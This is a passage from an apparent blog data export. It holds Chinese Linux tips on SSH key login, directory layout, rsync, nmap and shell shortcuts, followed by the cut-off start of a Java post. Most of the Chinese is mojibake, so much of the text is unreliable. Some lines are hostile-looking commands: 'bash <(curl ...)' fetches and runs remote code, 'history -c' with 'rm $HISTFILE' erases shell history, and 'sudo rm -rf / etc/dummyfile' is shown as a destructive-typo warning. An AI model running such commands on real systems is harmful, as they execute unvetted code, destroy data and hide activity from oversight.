| sort -rn ## æŒ‰ç…§æ–‡ä»¶åå€’åºæ’åº du -hsBM ./* | sort -n ##æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œä»å°åˆ°å¤§æ’åº -u(unique)æ˜¯å¿½ç•¥ç›¸åŒè¡Œï¼ŒæŸ¥æ‰¾ç™»å½•è®°å½•çš„æ—¶å€™æœ‰ç”¨-t æŒ‡å®šæŒ‰ç…§æ å’Œæ ä¹‹é—´çš„åˆ†éš”ç¬¦ 20. historyå‘½ä»¤history ## åˆ—å‡ºæ›¾ç»æ‰§è¡Œè¿‡çš„å‘½ä»¤ !99 ##æ‰§è¡Œä¸Šé¢åˆ—è¡¨ä¸­ç¬¬99æ¡å‘½ä»¤ !! ##æ‰§è¡Œä¸Šä¸€æ¡å‘½ä»¤ history 10 ##åˆ—å‡ºæœ€è¿‘æ‰§è¡Œçš„10æ¡å‘½ä»¤ 21. ä½¿ç”¨sshKeyGenå…å¯†ç ç™»å½•çš„æ–¹å¼é¦–å…ˆåœ¨windowsä¸Šå®‰è£…puttyï¼Œé»˜è®¤ä¼šè£…ä¸ŠputtyGenã€‚åœ¨å¼€å§‹èœå•é‡Œé¢æ€»å½’èƒ½æ‰¾åˆ°ã€‚ç‚¹å‡»é‚£ä¸ªgenerateæŒ‰é’®ï¼ŒæŒ‰ç…§æç¤ºé¼ æ ‡ä¸åœæŒªåŠ¨ï¼Œè¿›åº¦æ¡èµ°å®Œã€‚ä¼šç”Ÿæˆå…¬é’¥ï¼Œç‚¹å‡»Save private keyç”Ÿæˆç§é’¥ã€‚æç¤ºä¿å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªè¦ä¿å­˜å¥½ã€‚æš‚æ—¶ä¸è¦å…³é—­puttygen,éœ€è¦ç›´æ¥å»å¤åˆ¶ç²˜è´´é‚£ä¸ªpublic key(å› ä¸ºè¦æ˜¯ç”Ÿæˆäº†ä¸€ä¸ªpublic keyï¼Œç”±äºwindowsçš„åŸå› ï¼Œä¸­é—´å¯èƒ½å­˜åœ¨æ¢è¡Œï¼Œå°±å¾—åœ¨æ–‡æœ¬ç¼–è¾‘å™¨é‡Œé¢åˆ æ‰æ‰€æœ‰çš„æ¢è¡Œç¬¦ï¼Œéå¸¸éº»çƒ¦)å¯†ç ç™»å½•åˆ°æœåŠ¡å™¨ç«¯ï¼Œcdåˆ°~/.ssh/æ–‡ä»¶å¤¹ä¸‹ï¼Œæ²¡æœ‰å°±mkdirä¸€ä¸ªï¼Œåˆ›å»ºä¸€ä¸ªauthorized_keysçš„æ–‡ä»¶ï¼Œè¦æ˜¯æœ¬æ¥å°±æœ‰ï¼ŒæŠŠputtygenç”Ÿæˆçš„public-keyçš„å†…å®¹è¿½åŠ åˆ°æ–‡ä»¶å°¾éƒ¨ã€‚çœ‹ä¸‹/etc/ssh/sshd_configä¸­æ˜¯å¦ç¬¦åˆå¦‚ä¸‹æè¿°å¦‚ä¸‹æ¡ä»¶ RSAAuthentication yes PubkeyAuthentication yes PermitRootLogin yes è¿˜è¦ç»™æƒé™chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keysé‡å¯sshæœåŠ¡ï¼š service sshd restartputtyç™»å½•çª—å£å·¦ä¾§æœ‰ä¸€ä¸ªloggin-authï¼Œè¿›å»é€‰æ‹©è‡ªå·±windowsä¸Šåˆšæ‰ä¿å­˜çš„ç§é’¥æ–‡ä»¶ã€‚ç™»å½•è¾“å…¥è´¦æˆ·åå³å¯è‡ªåŠ¨ç™»å½•æˆåŠŸã€‚PUTTYGEN - KEY GENERATOR FOR PUTTY ON WINDOWSæœ‰ä»€ä¹ˆé—®é¢˜çš„è¯çœ‹è¿™ä¸ª 22.iptableså‘½ä»¤å¸¸ç”¨çš„iptableså‘½ä»¤å»è¿™é‡ŒæŠ„ï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯èƒ½ç”¨çš„å¤šä¸€äº› 23. Linuxè½¯ä»¶å®‰è£…ç›®å½•æƒ¯ä¾‹è½¬è½½è‡ªã€‚ä¸€èˆ¬ç‰¹å®šæ–‡ä»¶å¤¹é‡Œæ”¾ä»€ä¹ˆä¸œè¥¿æ˜¯æœ‰æƒ¯ä¾‹çš„ã€‚cdåˆ°æ ¹ç›®å½•ä¸‹é•¿è¿™æ ·drwxr-xr-x 26 root root 4096 Jan 26 10:08 .drwxr-xr-x 26 root root 4096 Jan 26 10:08 ..drwxr-xr-x 2 root root 12288 Jan 5 22:52 bin ##sbinå’Œbinä¸€æ ·ï¼Œå­˜executable programsdrwxr-xr-x 4 root root 3072 Jan 26 10:08 bootdrwxr-xr-x 18 root root 4060 Feb 3 17:00 devdrwxr-xr-x 109 root root 4096 Feb 4 04:18 etc ##configuration files , æ¯”å¦‚passwddrwxr-xr-x 3 root root 4096 Aug 6 05:42 home ##æ‰€æœ‰ç”¨æˆ·çš„home directorydrwxr-xr-x 22 root root 4096 Jan 5 22:53 lib ## ç³»ç»Ÿç”¨çš„common librarydrwxr-xr-x 2 root root 4096 Jan 19 06:30 lib64 ##drwxâ€”â€” 2 root root 16384 Mar 14 2017 lost+founddrwxr-xr-x 3 root root 4096 Mar 14 2017 mediadrwxr-xr-x 2 root root 4096 Feb 15 2017 mnt ##temp file systems are attached like cd rom or usb drive(å°±å½“ä¼˜ç›˜å¥½äº†)drwxr-xr-x 2 root root 4096 Feb 15 2017 optdr-xr-xr-x 130 root root 0 Feb 3 17:00 proc ##è¿™ä¸ªå¿µprocedure, ä»£è¡¨virtual file system stores kernel infoï¼ŒçŸ¥é“ä¸ºä»€ä¹ˆçœ‹cpuå‹å·è¦cat /procäº†å§drwxâ€”â€” 6 root root 4096 Dec 21 02:16 root ##root accountçš„æ ¹ç›®å½•drwxr-xr-x 25 root root 940 Feb 4 08:07 rundrwxr-xr-x 2 root root 12288 Jan 19 06:30 sbin ##sbinå’Œbinä¸€æ ·ï¼Œå­˜executable programs,sä»£è¡¨essential system binarydrwxr-xr-x 2 root root 4096 Jan 14 2017 snapdrwxr-xr-x 2 root root 4096 Feb 15 2017 srvdr-xr-xr-x 13 root root 0 Feb 4 08:08 sysdrwxrwxrwt 9 root root 4096 Feb 4 08:05 tmp ## contain temporary data,æ³¨æ„ï¼Œè¯¥ç›®å½•ä¸‹æ–‡ä»¶é‡å¯åè¢«eraseddrwxr-xr-x 11 root root 4096 Dec 10 01:04 usr ##è¿™é‡Œé¢æœ‰bin man sbinç­‰ç›®å½•ï¼Œå­˜æ”¾user program and other data(å¹¶ä¸æ˜¯userï¼Œè€Œæ˜¯universal system resources)drwxr-xr-x 14 root root 4096 Dec 10 22:21 var ## å…¨ç§°variableï¼Œå­˜æ”¾variable data where system must be able to write during operation(å°±æ˜¯log) /usrï¼šç³»ç»Ÿçº§çš„ç›®å½•ï¼Œå¯ä»¥ç†è§£ä¸ºC:/Windows/ï¼Œ/usr/libç†è§£ä¸ºC:/Windows/System32ã€‚/usr/localï¼šç”¨æˆ·çº§çš„ç¨‹åºç›®å½•ï¼Œå¯ä»¥ç†è§£ä¸ºC:/Progrem Files/ã€‚ç”¨æˆ·è‡ªå·±ç¼–è¯‘çš„è½¯ä»¶é»˜è®¤ä¼šå®‰è£…åˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚/optï¼šç”¨æˆ·çº§çš„ç¨‹åºç›®å½•ï¼Œå¯ä»¥ç†è§£ä¸ºD:/Softwareï¼Œoptæœ‰å¯é€‰çš„æ„æ€ï¼Œè¿™é‡Œå¯ä»¥ç”¨äºæ”¾ç½®ç¬¬ä¸‰æ–¹å¤§å‹è½¯ä»¶ï¼ˆæˆ–æ¸¸æˆï¼‰ï¼Œå½“ä½ ä¸éœ€è¦æ—¶ï¼Œç›´æ¥rm -rfæ‰å³å¯ã€‚åœ¨ç¡¬ç›˜å®¹é‡ä¸å¤Ÿæ—¶ï¼Œä¹Ÿå¯å°†/optå•ç‹¬æŒ‚è½½åˆ°å…¶ä»–ç£ç›˜ä¸Šä½¿ç”¨ã€‚ /usr/srcï¼šç³»ç»Ÿçº§çš„æºç ç›®å½•ã€‚/usr/local/srcï¼šç”¨æˆ·çº§çš„æºç ç›®å½•ã€‚ å„ä¸ªç›®å½•youtube-dlçš„å®‰è£…é€”å¾„å°±æ˜¯ä¸‹ä¸€ä¸ªè½¯ä»¶ä¸‹æ¥ï¼Œç„¶åchmodç»™æƒé™ï¼Œç„¶å/usr/local/bin/youtube-dlå’Œç›´æ¥æ•²youtube-dlæ˜¯ä¸€ä¸ªå‘½ä»¤ã€‚å¥½åƒæ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹é¢å°±å¥½äº†ã€‚å…³äºè¿™äº›ç›®å½•çš„è§£é‡Š/binæ˜¯ç³»ç»Ÿçš„ä¸€äº›æŒ‡ä»¤ã€‚binä¸ºbinaryçš„ç®€å†™ï¼›/sbinä¸€èˆ¬æ˜¯æŒ‡è¶…çº§ç”¨æˆ·æŒ‡ä»¤ã€‚å°±æ˜¯åªæœ‰ç®¡ç†å‘˜æ‰èƒ½æ‰§è¡Œçš„å‘½ä»¤/usr/binï¼šé€šå¸¸æ˜¯ä¸€äº›éå¿…è¦çš„ï¼Œä½†æ˜¯æ™®é€šç”¨æˆ·å’Œè¶…çº§ç”¨æˆ·éƒ½å¯èƒ½ä½¿ç”¨åˆ°çš„å‘½ä»¤/usr/local/binï¼šé€šå¸¸æ˜¯ç”¨æˆ·åæ¥å®‰è£…çš„è½¯ä»¶ï¼Œå¯èƒ½è¢«æ™®é€šç”¨æˆ·æˆ–è¶…çº§ç”¨æˆ·ä½¿ç”¨ /varï¼šæŸäº›å¤§æ–‡ä»¶çš„æº¢å‡º åŒºï¼Œæ¯”æ–¹è¯´å„ç§æœåŠ¡çš„æ—¥å¿—æ–‡ä»¶ã€‚/usrï¼šæœ€åºå¤§çš„ç›®å½•ï¼Œè¦ç”¨ åˆ°çš„åº”ç”¨ç¨‹åºå’Œæ–‡ä»¶å‡ ä¹éƒ½åœ¨è¿™ä¸ªç›®å½•ã€‚/usr/local: æœ¬åœ°å®‰è£…çš„ç¨‹åºå’Œå…¶ä»–ä¸œè¥¿åœ¨/usr/localä¸‹ä¸€ä»½æ¯”è¾ƒå…¨é¢çš„Linux ä¸‹å„æ–‡ä»¶å¤¹çš„ç»“æ„è¯´æ˜åŠç”¨é€”ä»‹ç» 24. ä¸€ä¸ªå¾€dropBoxä¸Šä¼ æ–‡ä»¶çš„Scriptdropboxçš„ç½‘ç›˜ç©ºé—´ä¸ç”¨æ„Ÿè§‰æœ‰ç‚¹æµªè´¹äº†ï¼Œä¸€ä¸ªå°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ åˆ°dropBoxçš„è„šæœ¬Dropbox-Uploaderäº²æµ‹å¯ç”¨ï¼Œä¹Ÿä¸æ˜¯ä¸€ä¸ªéœ€è¦å¯åŠ¨æ—¶è·‘èµ·æ¥çš„ç¨‹åºï¼Œå°±æ˜¯ä¸€ä¸ªç»™å‚æ•°å°±ä¸Šä¼ çš„è„šæœ¬ã€‚ ./dropbox_uploader.sh upload /localFileOrDir /dropBoxFileOrDir 25. fuseræ˜¾ç¤ºå½“å‰æ–‡ä»¶æ­£åœ¨è¢«å“ªäº›è¿›ç¨‹ä½¿ç”¨fuser -m -u redis-server 26. ä¸€äº›çœ‹ä¸Šå»æ¯”è¾ƒç„çš„æ“ä½œbash &lt;(curl -s https://codecov.io/bash) ##é‡å®šå‘è¿˜æœ‰è¿™ä¹ˆç©çš„ pbcopy &lt; somefile.txt ## macä¸Šä¸€èˆ¬è¿™æ ·å¤åˆ¶ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹åˆ°å‰ªåˆ‡æ¿ 27.htopæ€ä¹ˆçœ‹process stateå›¾ç‰‡å‡ºå¤„ PROCESS STATE CODES R running or runnable (on run queue) D uninterruptible sleep (usually IO) S interruptible sleep (waiting for an event to complete) Z defunct/zombie, terminated but not reaped by its parent T stopped, either by a job control signal or because it is being traced [â€¦] ä¸€èˆ¬éƒ½æ˜¯Sæ¯”è¾ƒå¤šï¼ŒZå±äºZombieè¿›ç¨‹ï¼Œç›´æ¥å¹²æ‰ å†æä¸€ä¸‹topæ˜¯æ€ä¹ˆçœ‹çš„topå…¶ä¸­ç¬¬ä¸‰è¡ŒCPUä¿¡æ¯ä¸­ï¼šusr ä»£è¡¨ç”¨æˆ·ç©ºé—´å ç”¨CPUçš„ç™¾åˆ†æ¯”ï¼Œsys ä»£è¡¨å†…æ ¸ç©ºé—´å ç”¨CPUçš„ç™¾åˆ†æ¯”ï¼Œnic ä»£è¡¨æ”¹å˜è¿‡ä¼˜å…ˆçº§çš„è¿›ç¨‹å ç”¨CPUçš„ç™¾åˆ†æ¯”ï¼Œidle ä»£è¡¨ç©ºé—²çš„CPUçš„ç™¾åˆ†æ¯”ï¼Œio ä»£è¡¨IOç­‰å¾…å ç”¨CPUçš„ç™¾åˆ†æ¯”ï¼Œirq ä»£è¡¨ç¡¬ä»¶ä¸­æ–­å ç”¨CPUçš„ç™¾åˆ†æ¯”ï¼Œsirq ä»£è¡¨è½¯ä»¶ä¸­æ–­å ç”¨CPUçš„ç™¾åˆ†æ¯”ã€‚ Mere trashgdbè°ƒè¯•å™¨,debugç”¨çš„ æ–‡ä»¶æè¿°ç¬¦é™åˆ¶ ls -al = l -alï¼ˆå¯ä»¥å°‘æ•²ä¸€ä¸ªå­—æ¯,å…¶å®æ˜¯aliasï¼‰ small tricks cat &gt; filename.txt then start typing your text content ctrl +d to finish pushd and popd can help you jump to some directory can come back later gdebi ## like dpkg command , will install required dependency if needed cpulimit command ##limit the cpu usage to certain process htopä¸­æŒ‰f4å¯ä»¥filterï¼ŒæŒ‰f9å¯ä»¥æ€è¿›ç¨‹ã€‚ æŒ‰ä¸‹ç©ºæ ¼é”®å¯ä»¥é€‰ä¸­æŸä¸ªprocessï¼ˆç”¨äºå¤šé€‰ï¼‰ bleachbitå¯ä»¥å¸®åŠ©æ¸…ç†åƒåœ¾ rsyncç”¨äºåšç³»ç»Ÿå¤‡ä»½ rsync -avz --delete Pictures/ 192.168.0.10:Pictures/ ## aè¡¨ç¤ºarchiveï¼Œå°±æ˜¯è¯´ä¿ç•™æºæ–‡ä»¶çš„permission,timestampç­‰ç­‰ï¼Œ vè¡¨ç¤ºverbose, zè¡¨ç¤ºzip(å°±åƒgzipä¸€æ ·ï¼Œé€šè¿‡ç½‘ç»œä¼ è¾“çš„æ—¶å€™èƒ½å¤ŸèŠ‚çœæµé‡),è®°å¾—Picturesåé¢çš„æ–œæ ä¸èƒ½å°‘ ubuntuä¸Šä½¿ç”¨sudo xxx ï¼Œè¾“å…¥å¯†ç åï¼Œä¸‹æ¬¡sudoå°±ä¸ä¼šå†æ¬¡è¦æ±‚å¯†ç äº†ï¼Œä½†å…¶å®ç³»ç»Ÿä¼šèµ·ä¸€ä¸ªå€’è®¡æ—¶ï¼Œå¦‚æœæ¥ä¸‹æ¥çš„30åˆ†é’Ÿï¼ˆå¤§æ¦‚è¿™ä¸ªæ—¶é—´ï¼‰å†…æ²¡æœ‰æ‰§è¡Œsudoå‘½ä»¤ï¼Œå°†ä¼šå†æ¬¡æç¤ºè¦æ±‚è¾“å…¥å¯†ç  è§£å†³æ–¹æ³•sudo -su // å³åç»­sudoæŒ‡ä»¤ä¸éœ€è¦å¯†ç  æ‰“å¼€ttyçš„æ–¹æ³•: ctrl + alt + (f1-f8) sfpt cindy@192.168.0.2 ##ä»¥cindyçš„èº«ä»½ç™»å½•è¿™å°æœºå™¨ ## bashçš„çª—å£åœ¨ç­‰å¾…è¾“å…¥çš„æ—¶å€™ä¸€èˆ¬é•¿è¿™æ ·: john@server ~ $ johnè¡¨ç¤ºå½“å‰ç”¨æˆ·åç§° severè¡¨ç¤ºå½“å‰ä¸»æœºåç§° ~è¡¨ç¤ºå½“å‰æ‰€åœ¨ç›®å½• $è¡¨ç¤ºæ²¡æœ‰ç‰¹æ®Šæƒé™ï¼Œå°±æ˜¯è¯´ä¸æ˜¯root previledgeçš„æ„æ€ bashå’Œshçš„åŒºåˆ« &gt; #!/bin/bash ## ä¸€ä¸ªäº•å·åŠ ä¸Šä¸€ä¸ªæ„Ÿå¹å·åœ¨è®¡ç®—æœºé¢†åŸŸå«åšshebang.å¾ˆå¤šshellè„šæœ¬çš„ç¬¬ä¸€è¡Œéƒ½æœ‰ï¼š #!/bin/bash ä¸€å®šæ˜¯bashï¼Œä¸‡ä¸€æ²¡è£…bashä¼šæŠ¥é”™,è¿˜æœ‰äº›ç³»ç»Ÿçš„bashè£…è½½/usr/pkg/binæˆ–è€…/usr/local/biné‡Œé¢ æˆ–è€…æ˜¯ #!/bin/sh å°±ä¼šä½¿ç”¨å½“å‰æ“ä½œç³»ç»Ÿä¸Šçš„sh,ä¸ä¸€å®šæ˜¯bash.æ¯”å¦‚debianä¸Šshæ˜¯dashçš„symbolic link æ¯”è¾ƒå¯é çš„æ–¹å¼æ˜¯ #!/usr/bin/env bash ç”¨çš„æ˜¯$PATH ## file -h /bin/sh è¿™ä¸ªå‘½ä»¤ç”¨äºæŸ¥çœ‹æ–‡ä»¶ /bin/sh: symbolic link to dash Because sh is a specification, not an implementation, /bin/sh is a symlink (or a hard link) to an actual implementation on most POSIX systems.(shæ˜¯POSIXæ ‡å‡†è§„å®šçš„ä¸€å¥—åè®®ï¼Œå¹¶éå®ç°.shçš„å®ç°æœ‰å¾ˆå¤šç§ï¼Œzsh,dash,bashç­‰ç­‰ã€‚ä½†åœ¨å¾ˆå¤šç³»ç»Ÿä¸Šï¼Œshæ˜¯bashçš„symbolic link).ç›¸æ¯”èµ·æ¥,bashçš„åŠŸèƒ½è¦æ¯”shå¼ºå¤§ä¸å°‘ã€‚Plain sh is a very minimalistic programming language. Posixè¡¨ç¤ºå¯ç§»æ¤æ“ä½œç³»ç»Ÿæ¥å£ï¼ˆPortable Operating System Interfaceï¼Œç¼©å†™ä¸ºPOSIXï¼‰ï¼ŒPOSIXæ ‡å‡†å®šä¹‰äº†æ“ä½œç³»ç»Ÿåº”è¯¥ä¸ºåº”ç”¨ç¨‹åºæä¾›çš„æ¥å£æ ‡å‡†ï¼Œæ˜¯IEEEä¸ºè¦åœ¨å„ç§UNIXæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œçš„è½¯ä»¶è€Œå®šä¹‰çš„ä¸€ç³»åˆ—APIæ ‡å‡†çš„æ€»ç§°ï¼Œå…¶æ­£å¼ç§°å‘¼ä¸ºIEEE 1003ï¼Œè€Œå›½é™…æ ‡å‡†åç§°ä¸ºISO/IEC 9945ï¼› ### ä¸‹é¢è¿™ä¸‰ä¸ªè¦è·Ÿctrl+zä¸€èµ·ç”¨ bg ##çœ‹ä¹‹å‰æŒ‰ctrl+zé€€åˆ°åå°çš„ç¨‹åº jobs ##æŸ¥çœ‹å½“å‰åœ¨è·‘çš„ç¨‹åº fg job name ##æŠŠè¿™ä¸ªç¨‹åºæ‹‰åˆ°å‰å° æ¯”æ–¹è¯´å½“å‰ç›®å½•ä¸‹æœ‰ä¸€ä¸ªdump.shæ–‡ä»¶ï¼Œæƒ³è¦æ‰§è¡Œçš„è¯ï¼Œè¾“å…¥dumpæ˜¯æ²¡æœ‰ç”¨çš„ã€‚å› ä¸ºecho $PATHä¸­å¹¶æ²¡æœ‰è¿™ä¸ªdump:ç›®å½•/dusp.shã€‚ æ‰€ä»¥è¦æ‰§è¡Œè¿™ä¸ªshï¼Œéœ€è¦./dump.sh æˆ–è€…å»ºä¸€ä¸ªsymbolic linkåˆ° /usr/local/binä¸‹é¢ï¼Œæ¯”å¦‚è¿™æ · sudo ln -s /full/path/to/your/file /usr/local/bin/name_of_new_command æƒ³è¦å¯æ‰§è¡Œçš„è¯ï¼Œè®°å¾—ç»™æƒé™ã€‚chmod +x /full/path/to/your/file å½“ç„¶ï¼Œæƒ³è¦ç§»é™¤è¿™ä¸ªè½¯é“¾æ¥çš„è¯. sudo rm -rf /usr/local/bin/name_of_new_command å…³äºç¡¬é“¾æ¥å’Œè½¯è¿æ¥ -s å°±æ˜¯è½¯é“¾æ¥ã€‚ä¸åŠ -så°±æ˜¯ç¡¬é“¾æ¥ã€‚ ä¿®æ”¹ç¡¬é“¾æ¥å’Œè½¯é“¾æ¥çš„å†…å®¹éƒ½ä¼šåŒæ­¥åˆ°æºæ–‡ä»¶ï¼Œè½¯é“¾æ¥å’Œç¡¬é“¾æ¥åˆ æ‰äº†éƒ½ä¸ä¼šå½±å“æºæ–‡ä»¶ã€‚æœ‰ä¸€ä¸ªåŒºåˆ«å°±æ˜¯åˆ æ‰æºæ–‡ä»¶æ—¶ï¼Œç¡¬é“¾æ¥ä¿æœ‰äº†æºæ–‡ä»¶çš„å†…å®¹ã€‚ è½¯é“¾æ¥å°±brokenäº†ã€‚ visudo //via sudo è¿™æ˜¯ä¸€ä¸ªæ§åˆ¶ç”¨æˆ·æƒé™çš„æ–‡ä»¶ï¼Œæ¯”å¦‚è¯´å¸Œæœ›ç»™ç‰¹å®šç”¨æˆ·ä¸€éƒ¨åˆ†usdoç‰¹æƒï¼Œæ¯”å¦‚åªç»™å®‰è£…è½¯ä»¶çš„æƒåˆ©ï¼Œç¼–è¾‘è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥ ä¸ºä»€ä¹ˆä¸è¦æ€»ä»¥rootæƒé™åšäº‹: sudo rm -rf /etc/dummyfile ## çœ‹ä¸Šå»ok sudo rm -rf / etc/dummyfile ## ä¸å°å¿ƒå¤šäº†ä¸ªç©ºæ ¼ï¼Œç³»ç»Ÿå¹¶ä¸ä¼šæ‹¦ç€ä½ ï¼Œè¿™æ ·å°±åˆ æ‰äº†æ‰€æœ‰çš„æ–‡ä»¶ raspberry Piä½¿ç”¨çš„æ˜¯Raspbian -- åŸºäºdebian æŸ¥çœ‹å†…å­˜é™¤äº†free å’Œhtopä¹‹å¤– sudo sh -c &quot;sync; echo 3 &gt; /proc/sys/vm/drop_caches&quot; ## å°±æ˜¯ç”¨shæ‰§è¡Œä¸€ä¸ªcommand, å³dump memory cacheï¼Œç±»ä¼¼äºwindowsä¸Š360é‚£ä¸ªç‚¹å‡»æ¸…å†…å­˜ sudo bash -c &quot;echo &#39;vm.swappiness =15&#39; &gt;&gt; /etc/sysctl.conf&quot; ## -cè¡¨ç¤ºè®©bashæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œ swappinessé»˜è®¤å€¼æ˜¯60ï¼Œæ„æ€æ˜¯ç³»ç»Ÿåœ¨ç”¨æ‰äº†60%çš„å†…å­˜åå°±å°†å¼€å§‹å¯ç”¨swap nmapå¯ä»¥ç”¨æ¥æ‰«ææŸå°è¿œç¨‹ä¸»æœºä¸Šopençš„portç›´æ¥çœ‹nmap cheetsheetå¥½äº† nmap -p 1-100 192.168.1.1 ## æ‰«æ1-100çš„portï¼Œéå¸¸æ…¢ Skip the port scan (-sn) when you only need to determine what hosts are online. linuxçš„swapæ–‡ä»¶éœ€è¦ç»å¸¸è¯»å†™ï¼Œè¿™å¯¹äºssdæ¥è¯´æ˜¯ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹digital oceanåœ¨æ·»åŠ swapæ•™ç¨‹çš„æœ€å‰é¢å°±å†™äº†ä¸å»ºè®®ssdç”¨æˆ·æ·»åŠ swap,å› ä¸ºä¼šè´¹ssd bashä¸‹çš„ä¸€äº›å¿«æ·é”® Ctrl-u - Cut everything before the cursor // æ¸…é™¤å…‰æ ‡ä¹‹å‰æ‰€æœ‰æ–‡å­— Ctrl-k Cut everything after the cursor //åˆ é™¤å…‰æ ‡åé¢çš„æ‰€æœ‰æ–‡å­— Ctrl-a Move cursor to beginning of line //å…‰æ ‡æŒªåˆ°æœ€å‰é¢ Ctrl-e Move cursor to end of line // æŒªåˆ°æœ€å³ä¾§ Ctrl-b Move cursor back one word //è¿™ä¸ªæ˜¯ä¸€ä¸ªå­—ä¸€ä¸ªå­—çš„æŒªï¼Œä¸è¯†åˆ«ç©ºæ ¼ Ctrl-f Move cursor forward one word//è¿™ä¸ªæ˜¯ä¸€ä¸ªå­—ä¸€ä¸ªå­—çš„æŒªï¼Œä¸è¯†åˆ«ç©ºæ ¼ alt + â†’ ä¸€ä¸ªå•è¯ä¸€ä¸ªå•è¯çš„å¾€å³æŒªï¼Œå¾€å·¦æŒªè‡ªç„¶å°±æ˜¯å‘å·¦ç®­å¤´äº†ã€‚ Ctrl-w Cut the last word Ctrl-y Paste the last thing to be cut Ctrl-_ Undo supervisorå¯ä»¥ç”¨äºç®¡ç†ä¸€äº›ç¨‹åºçš„è¿è¡Œï¼ŒæŒ‚äº†è´Ÿè´£è‡ªåŠ¨æ‹‰èµ·æ¥ã€‚å¾ˆç®€å•çš„ï¼Œå°±æ˜¯è£…ä¸€ä¸ªè½¯ä»¶ï¼Œå†™ä¸€ä¸ªconfã€‚ apt-getçš„æ•°æ®åº“æ”¾åœ¨ /var/lib/dpkg/info dpkg: warning: files list file for package `x&#39; missing; assuming package has no files currently installed ##å‡ºç°ä¸Šé¢çš„é”™è¯¯ï¼Œè¿™ä¸¤æ¡å‘½ä»¤ä¿®å¤ sudo rm -f /var/lib/dpkg/info/format sudo dpkg --configure -a æœ‰æ—¶å€™cdè¿›ä¸€ä¸ªæƒé™ä¸å¤Ÿçš„ç›®å½•ä¼šå‡ºç°Permission Denied sudo sucd directoryç›´æ¥è½¬æˆrootå°±å¥½äº† nanoç›´æ¥è·³åˆ°æ–‡æœ¬æœ€åä¸€è¡Œçš„æ–¹æ³•æ˜¯ï¼š Ctrl + _ ç„¶åCtrl +V how-to-install-java-with-apt-get-on-ubuntu-16-04)è£…JenkinsCould not find or load main classçš„é—®é¢˜ ğŸ§ ~/.vimrcæ–‡ä»¶ä¿®æ”¹ä¹‹åæ˜¯ä¸éœ€è¦sourceçš„ï¼Œä¸‹æ¬¡é‡æ–°å¯åŠ¨ä¸€ä¸ªvimçš„æ—¶å€™vimä¼šç›´æ¥å»è¯»è¿™ä¸ªæ–‡ä»¶ æŸ¥çœ‹å½“å‰shellçš„historyæ–‡ä»¶æ˜¯å“ªä¸ªecho $HISTFILEæ¸…é™¤shell historyçš„è¯ï¼šhistory -cç„¶ååˆ æ‰è¿™ä¸ªæ–‡ä»¶rm $HISTFILE ç†Ÿæ‚‰äº†bashä¹‹åï¼Œå†æ¥çœ‹zshï¼Œä¼¼ä¹æ›´åŠ è½»æ¾çœ‹ä¸€ä¸‹æˆ‘å½“å‰ä½¿ç”¨çš„æ˜¯å“ªç§sh: echo $SHELLlinuxä¸Šç›®æµ‹æ²¡æœ‰é»˜è®¤å®‰è£…zshã€‚ linuxä¸Š.pidæ–‡ä»¶æ˜¯ç”¨äºè®°å½•å½“å‰è¿›ç¨‹è¿è¡Œä¿¡æ¯çš„cat /var/run/nginx.pid435çœ‹ä¸‹ps -a | grep nginx æ˜¯ä¸æ˜¯ä¹Ÿæ˜¯435çš„pid å®‰è£…å®Œzshä¸€å®šè¦è£…ä¸Šè¿™ä¸ªçš„ï¼Œon-my-zshzshæœ‰ä¸€ä¸ªpluginçš„æ¦‚å¿µï¼Œè¿™ä¸ªæ˜¯è‡ªåŠ¨æç¤ºçš„æ’ä»¶zshçš„ä¸»é¢˜ä¸ªäººåå¥½Draculaagnosteræ˜¯å¦ä¸€æ¬¾å¾ˆå¤šäººéƒ½è£…ä¸Šçš„ä¸»é¢˜ï¼Œä¸»é¢˜è¿™ç§ä¸œè¥¿çœ‹ä¸ªäººå–œå¥½äº†ã€‚ å¦‚æœåœ¨å›½å†…ä½¿ç”¨çš„è¯ï¼Œä½¿ç”¨æ¸…åå¤§å­¦å¼€æºç«™çš„é•œåƒçš„é€Ÿåº¦ä¼šå¿«ä¸€ç‚¹ oh-my-zshçš„git plugin å¿«æ·é”®grep -ni â€œpythonâ€ * //åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾æ‰€æœ‰åŒ…å«â€pythonâ€å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶ä¸”æ˜¾ç¤ºå‡ºè¡Œå·ã€‚ ctrl +r å¯ä»¥åœ¨historyä¸­æŸ¥æ‰¾,ctrl + j æŠŠé€‰ä¸­çš„å†…å®¹å‰ªåˆ‡åˆ°å‰ªåˆ‡æ¿ ä¸ç”¨è£…treeè¿™ä¸ªè½¯ä»¶ä¹Ÿè¡Œ which treetree: aliased to find . -print | sed -e â€˜s;[^/]*/;|;g;s;|; |;gâ€™ å‚è€ƒ æ¯å¤©ä¸€ä¸ªLinuxå‘½ä»¤ Linuxå‘½ä»¤å¤§å…¨ awkæ˜¯ä¸‰ä¸ªäººçš„åå­— æ ‘è“æ´¾æ­å»ºå±€åŸŸç½‘åª’ä½“æœåŠ¡å™¨ï¼Œä¸‹è½½æœº Linuxä¸­å›½","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"For those tiny details in Java","date":"2017-06-17T21:24:48.000Z","path":"2017/06/17/2017-06-17-tiny-details-in-java/","text":"interesting stuff in java that donâ€™t seem to get enough pubilicity 1. getting the concreate class from generic types```java /** * Make a GET request and return a parsed object from JSON. * * @param url URL of the request to make * @param clazz Relevant class object, for Gson&#39;s reflection * @param headers Map of request headers */ public GenericMoshiRequest(String url, @Nullable Class&lt;T&gt; clazz, Map&lt;String, String&gt; headers, Response.Listener&lt;T&gt; listener, Response.ErrorListener errorListener) { super(Method.GET, url, errorListener); // this.clazz = clazz; Class entityClass = (Class) 